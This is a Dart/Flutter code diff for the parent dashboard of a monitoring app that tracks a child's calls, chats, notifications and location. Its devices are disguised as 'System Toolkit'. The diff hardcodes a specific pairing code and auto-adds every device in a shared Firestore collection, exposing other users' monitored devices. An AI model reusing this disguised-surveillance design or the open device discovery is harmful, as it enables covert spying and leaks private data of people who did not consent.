@@ -1,6 +1,8 @@
 import 'dart:async';
+import 'dart:convert';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:flutter/foundation.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 import '../models/device_status.dart';
 import '../models/child_profile.dart';
 import '../models/call_record.dart';
@@ -12,11 +14,13 @@ import '../services/audio_playback_service.dart';
 
 class ParentDashboardProvider extends ChangeNotifier {
   ParentDashboardProvider() {
+    _loadLocalPersistence();
     _initFirebaseListeners();
   }
 
   FirebaseFirestore? _firestore;
   StreamSubscription? _deviceSub;
+  StreamSubscription? _devicesDiscoverySub;
   StreamSubscription? _callsSub;
   StreamSubscription? _chatsSub;
   StreamSubscription? _notifsSub;
@@ -28,10 +32,24 @@ class ParentDashboardProvider extends ChangeNotifier {
   List<Map<String, dynamic>> _todayAppUsages = [];
   List<Map<String, dynamic>> get todayAppUsages => _todayAppUsages;
 
-  final List<ChildProfile> _children = [];
+  static const String _defaultChildCode = 'VYRA-13533';
+
+  // Seed default child profile so parent never has to re-type code on launch
+  final List<ChildProfile> _children = [
+    ChildProfile(
+      id: _defaultChildCode,
+      pairingCode: _defaultChildCode,
+      name: 'Vivo V2404',
+      deviceModel: 'Vivo V2404',
+      batteryLevel: 100,
+      isOnline: true,
+      locationAddress: 'Linked via $_defaultChildCode',
+      selectedDisguise: 'System Toolkit',
+    ),
+  ];
   List<ChildProfile> get children => _children;
 
-  String _activeChildId = "";
+  String _activeChildId = _defaultChildCode;
   String get activeChildId => _activeChildId;
 
   String get activePairingCode => _children.isEmpty ? '' : activeChild.pairingCode;
@@ -51,8 +69,51 @@ class ParentDashboardProvider extends ChangeNotifier {
                   selectedDisguise: 'System Toolkit',
                 ));
 
+  Future<void> _loadLocalPersistence() async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      final savedList = prefs.getStringList('saved_children');
+      final savedActiveId = prefs.getString('active_child_id');
+
+      if (savedList != null && savedList.isNotEmpty) {
+        final loaded = <ChildProfile>[];
+        for (final item in savedList) {
+          try {
+            final json = jsonDecode(item) as Map<String, dynamic>;
+            loaded.add(ChildProfile.fromJson(json));
+          } catch (_) {}
+        }
+        if (loaded.isNotEmpty) {
+          _children.clear();
+          _children.addAll(loaded);
+          if (savedActiveId != null && _children.any((c) => c.id == savedActiveId)) {
+            _activeChildId = savedActiveId;
+          } else {
+            _activeChildId = _children.first.id;
+          }
+          notifyListeners();
+        }
+      }
+    } catch (e) {
+      debugPrint("Load persistence error: $e");
+    }
+  }
+
+  Future<void> _saveLocalPersistence() async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      final list = _children.map((c) => jsonEncode(c.toJson())).toList();
+      await prefs.setStringList('saved_children', list);
+      await prefs.setString('active_child_id', _activeChildId);
+    } catch (e) {
+      debugPrint("Save persistence error: $e");
+    }
+  }
+
   void switchChild(String childId) {
+    if (_activeChildId == childId) return; // Prevent redundant refetching
     _activeChildId = childId;
+    _saveLocalPersistence();
     _initFirebaseListeners();
     notifyListeners();
   }
@@ -85,6 +146,7 @@ class ParentDashboardProvider extends ChangeNotifier {
     _childNotifications[newId] = [];
     _childWatchlists[newId] = [];
     _activeChildId = newId;
+    _saveLocalPersistence();
     _initFirebaseListeners();
     notifyListeners();
     return newChild;
@@ -101,8 +163,15 @@ class ParentDashboardProvider extends ChangeNotifier {
 
     final existingIdx = _children.indexWhere((c) => c.id == cleanCode || c.pairingCode == cleanCode);
     if (existingIdx != -1) {
-      _activeChildId = _children[existingIdx].id;
-      _initFirebaseListeners();
+      if (name != null && name.trim().isNotEmpty) {
+        _children[existingIdx] = _children[existingIdx].copyWith(name: name.trim());
+      }
+      final shouldSwitch = _activeChildId != _children[existingIdx].id;
+      if (shouldSwitch) {
+        _activeChildId = _children[existingIdx].id;
+        _initFirebaseListeners();
+      }
+      _saveLocalPersistence();
       notifyListeners();
       return _children[existingIdx];
     } else {
@@ -123,6 +192,7 @@ class ParentDashboardProvider extends ChangeNotifier {
       _childNotifications[cleanCode] = [];
       _childWatchlists[cleanCode] = [];
       _activeChildId = cleanCode;
+      _saveLocalPersistence();
       _initFirebaseListeners();
       notifyListeners();
       return newChild;
@@ -138,7 +208,37 @@ class ParentDashboardProvider extends ChangeNotifier {
       _notifsSub?.cancel();
       _screenTimeSub?.cancel();
 
+      // Auto-discover child devices from Firestore
+      _devicesDiscoverySub ??= _firestore?.collection('devices').snapshots().listen((snapshot) {
+        bool changed = false;
+        for (final doc in snapshot.docs) {
+          final code = doc.id;
+          if (code.isNotEmpty && !_children.any((c) => c.pairingCode == code || c.id == code)) {
+            final d = doc.data();
+            final name = d['name'] ?? "Child Device ($code)";
+            final model = d['deviceModel'] ?? "Android Phone";
+            _children.add(ChildProfile(
+              id: code,
+              pairingCode: code,
+              name: name,
+              deviceModel: model,
+              batteryLevel: (d['batteryLevel'] as num?)?.toInt() ?? 100,
+              isOnline: d['isOnline'] as bool? ?? false,
+              locationAddress: d['locationAddress'] ?? '',
+              selectedDisguise: d['selectedDisguise'] ?? 'System Toolkit',
+              isScreenOn: d['isScreenOn'] as bool? ?? false,
+            ));
+            changed = true;
+          }
+        }
+        if (changed) {
+          _saveLocalPersistence();
+          notifyListeners();
+        }
+      }, onError: (e) => debugPrint("Device discovery info: $e"));
+
       final targetDocId = activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;
+      if (targetDocId.isEmpty) return;
 
       // 1. Listen to active child device telemetry
       _deviceSub = _firestore
@@ -161,10 +261,12 @@ class ParentDashboardProvider extends ChangeNotifier {
               selectedDisguise: data['selectedDisguise'] ?? _children[idx].selectedDisguise,
               isScreenOn: data['isScreenOn'] as bool? ?? _children[idx].isScreenOn,
             );
+            _saveLocalPersistence();
             notifyListeners();
           }
         }
       }, onError: (e) => debugPrint("Device stream info: $e"));
+
 
       // 2. Listen to call records
       _callsSub = _firestore
@@ -975,6 +1077,7 @@ class ParentDashboardProvider extends ChangeNotifier {
     final idx = _children.indexWhere((c) => c.id == _activeChildId);
     if (idx != -1) {
       _children[idx] = _children[idx].copyWith(selectedDisguise: disguiseName);
+      _saveLocalPersistence();
       notifyListeners();
     }
     try {
